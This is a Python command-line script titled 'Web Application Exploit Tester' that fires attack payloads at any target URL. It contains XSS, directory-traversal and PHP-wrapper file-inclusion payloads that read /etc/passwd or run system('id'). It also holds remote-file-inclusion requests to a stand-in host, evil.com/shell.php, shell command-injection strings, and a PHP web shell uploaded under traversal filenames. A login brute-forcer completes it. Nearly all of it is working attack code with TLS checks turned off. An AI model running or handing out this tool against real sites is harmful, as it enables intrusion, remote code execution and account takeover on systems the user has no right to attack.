#!/usr/bin/env python3
import requests
import argparse
import sys
import re
import base64
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import time

class WebExploits:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()

    def test_xss(self, parameter="q", payload="<script>alert('XSS')</script>"):
        """Test for XSS vulnerabilities"""
        print(f"[*] Testing XSS on {self.target}")
        
        # Test reflected XSS
        try:
            url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
            response = self.session.get(url, timeout=self.timeout)
            
            if payload in response.text:
                print(f"[+] VULNERABLE: Reflected XSS found")
                print(f"    URL: {url}")
                return True
            else:
                print(f"[-] No reflected XSS detected")
                
        except Exception as e:
            print(f"[-] XSS test failed: {e}")
        
        # Test User-Agent XSS
        try:
            headers = {"User-Agent": payload}
            response = self.session.get(self.target, headers=headers, timeout=self.timeout)
            print(f"[*] Tested User-Agent XSS payload")
            
        except Exception as e:
            print(f"[-] User-Agent XSS test failed: {e}")
        
        return False

    def test_directory_traversal(self, parameter="page", depth=6):
        """Test for directory traversal vulnerabilities"""
        print(f"[*] Testing directory traversal on {self.target}")
        
        payloads = [
            "../" * depth + "etc/passwd",
            "%2e%2e/" * depth + "etc/passwd",
            "../" * depth + "windows/system32/drivers/etc/hosts",
            "..%2f" * depth + "etc/passwd"
        ]
        
        for payload in payloads:
            try:
                url = f"{self.target}?{parameter}={payload}"
                response = self.session.get(url, timeout=self.timeout)
                
                if "root:" in response.text or "daemon:" in response.text:
                    print(f"[+] VULNERABLE: Directory traversal found")
                    print(f"    URL: {url}")
                    print(f"    Found /etc/passwd content")
                    return True
                elif "# Copyright" in response.text and "hosts" in response.text:
                    print(f"[+] VULNERABLE: Directory traversal found (Windows)")
                    print(f"    URL: {url}")
                    return True
                    
            except Exception as e:
                print(f"[-] Directory traversal test failed: {e}")
        
        print(f"[-] No directory traversal detected")
        return False

    def test_lfi(self, parameter="page"):
        """Test for Local File Inclusion"""
        print(f"[*] Testing LFI on {self.target}")
        
        # PHP filter tests
        php_payloads = [
            f"php://filter/resource={parameter}",
            f"php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain,<?php echo system('id');?>",
            "data://text/plain;base64," + base64.b64encode(b"<?php echo system('id');?>").decode()
        ]
        
        for payload in php_payloads:
            try:
                url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=self.timeout)
                
                if "uid=" in response.text or "gid=" in response.text:
                    print(f"[+] VULNERABLE: LFI with code execution found")
                    print(f"    URL: {url}")
                    return True
                elif len(response.text) > 100 and response.status_code == 200:
                    print(f"[+] POTENTIAL: LFI response detected")
                    print(f"    URL: {url}")
                    
            except Exception as e:
                print(f"[-] LFI test failed: {e}")
        
        print(f"[-] No LFI detected")
        return False

    def test_rfi(self, parameter="page", evil_server="http://evil.com/shell.php"):
        """Test for Remote File Inclusion"""
        print(f"[*] Testing RFI on {self.target}")
        
        try:
            url = f"{self.target}?{parameter}={evil_server}"
            response = self.session.get(url, timeout=self.timeout)
            
            # Check if external resource was included
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] POTENTIAL: RFI may be possible")
                print(f"    URL: {url}")
                print(f"    Test with actual malicious server")
                return True
                
        except Exception as e:
            print(f"[-] RFI test failed: {e}")
        
        print(f"[-] No RFI detected")
        return False

    def test_command_injection(self, parameter="cmd"):
        """Test for OS command injection"""
        print(f"[*] Testing command injection on {self.target}")
        
        payloads = [
            "id",
            "; id",
            "| id", 
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "127.0.0.1; id",
            "127.0.0.1 && id"
        ]
        
        for payload in payloads:
            try:
                url = f"{self.target}?{parameter}={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=self.timeout)
                
                if "uid=" in response.text and "gid=" in response.text:
                    print(f"[+] VULNERABLE: Command injection found")
                    print(f"    URL: {url}")
                    print(f"    Payload: {payload}")
                    return True
                    
            except Exception as e:
                print(f"[-] Command injection test failed: {e}")
        
        print(f"[-] No command injection detected")
        return False

    def extract_csrf_token(self, url):
        """Extract CSRF/nonce tokens from page"""
        print(f"[*] Extracting CSRF tokens from {url}")
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            
            # Common token patterns
            patterns = [
                r'name="_token"\s+value="([^"]+)"',
                r'name="csrf_token"\s+value="([^"]+)"',
                r'name="_wpnonce"\s+value="([^"]+)"',
                r'<meta name="csrf-token" content="([^"]+)"',
                r'var\s+nonce\s*=\s*"([^"]+)"',
                r'"csrf_token"\s*:\s*"([^"]+)"'
            ]
            
            tokens = []
            for pattern in patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                tokens.extend(matches)
            
            if tokens:
                print(f"[+] Found {len(tokens)} potential tokens:")
                for i, token in enumerate(tokens):
                    print(f"    Token {i+1}: {token[:20]}...")
                return tokens
            else:
                print(f"[-] No CSRF tokens found")
                return []
                
        except Exception as e:
            print(f"[-] Token extraction failed: {e}")
            return []

    def test_file_upload(self, upload_url, file_param="file"):
        """Test file upload vulnerabilities"""
        print(f"[*] Testing file upload on {upload_url}")
        
        # Test PHP file upload
        php_content = "<?php echo system($_GET['cmd']); ?>"
        
        files_to_test = [
            ("test.php", php_content, "application/x-php"),
            ("test.phps", php_content, "application/x-php"),
            ("test.php7", php_content, "application/x-php"),
            ("test.PHP", php_content, "application/x-php"),
            ("../../../test.php", php_content, "application/x-php")
        ]
        
        for filename, content, content_type in files_to_test:
            try:
                files = {file_param: (filename, content, content_type)}
                response = self.session.post(upload_url, files=files, timeout=self.timeout)
                
                if response.status_code == 200 and "success" in response.text.lower():
                    print(f"[+] POTENTIAL: File upload successful - {filename}")
                elif "not allowed" in response.text.lower():
                    print(f"[-] File type blocked - {filename}")
                else:
                    print(f"[?] Upload response unclear - {filename}")
                    
            except Exception as e:
                print(f"[-] File upload test failed: {e}")

    def brute_force_login(self, login_url, username, password_list, username_param="username", password_param="password"):
        """Brute force login form"""
        print(f"[*] Brute forcing login at {login_url}")
        
        success_count = 0
        
        for password in password_list[:10]:  # Limit to first 10 for demo
            try:
                data = {username_param: username, password_param: password}
                response = self.session.post(login_url, data=data, timeout=self.timeout)
                
                # Check for successful login indicators
                if ("welcome" in response.text.lower() or 
                    "dashboard" in response.text.lower() or
                    response.status_code == 302):
                    print(f"[+] SUCCESS: {username}:{password}")
                    success_count += 1
                elif "invalid" in response.text.lower() or "failed" in response.text.lower():
                    print(f"[-] Failed: {username}:{password}")
                else:
                    print(f"[?] Unknown: {username}:{password}")
                    
                time.sleep(1)  # Rate limiting
                
            except Exception as e:
                print(f"[-] Login attempt failed: {e}")
        
        return success_count

def main():
    parser = argparse.ArgumentParser(description="Web Application Exploit Tester")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--xss", action="store_true", help="Test for XSS")
    parser.add_argument("--dir-traversal", action="store_true", help="Test directory traversal")
    parser.add_argument("--lfi", action="store_true", help="Test Local File Inclusion")
    parser.add_argument("--rfi", action="store_true", help="Test Remote File Inclusion")
    parser.add_argument("--cmd-inject", action="store_true", help="Test command injection")
    parser.add_argument("--csrf-tokens", action="store_true", help="Extract CSRF tokens")
    parser.add_argument("--file-upload", help="Test file upload (provide upload URL)")
    parser.add_argument("--brute-login", help="Brute force login (provide login URL)")
    parser.add_argument("--username", default="admin", help="Username for brute force")
    parser.add_argument("--passwords", help="Password list file")
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    
    args = parser.parse_args()
    
    if not args.target.startswith(('http://', 'https://')):
        args.target = 'http://' + args.target
    
    exploiter = WebExploits(args.target, args.timeout)
    
    if args.all or args.xss:
        exploiter.test_xss()
        print()
    
    if args.all or args.dir_traversal:
        exploiter.test_directory_traversal()
        print()
    
    if args.all or args.lfi:
        exploiter.test_lfi()
        print()
    
    if args.all or args.rfi:
        exploiter.test_rfi()
        print()
    
    if args.all or args.cmd_inject:
        exploiter.test_command_injection()
        print()
    
    if args.csrf_tokens:
        exploiter.extract_csrf_token(args.target)
        print()
    
    if args.file_upload:
        exploiter.test_file_upload(args.file_upload)
        print()
    
    if args.brute_login and args.passwords:
        try:
            with open(args.passwords, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            exploiter.brute_force_login(args.brute_login, args.username, passwords)
        except FileNotFoundError:
            print(f"[-] Password file not found: {args.passwords}")

if __name__ == "__main__":
    main()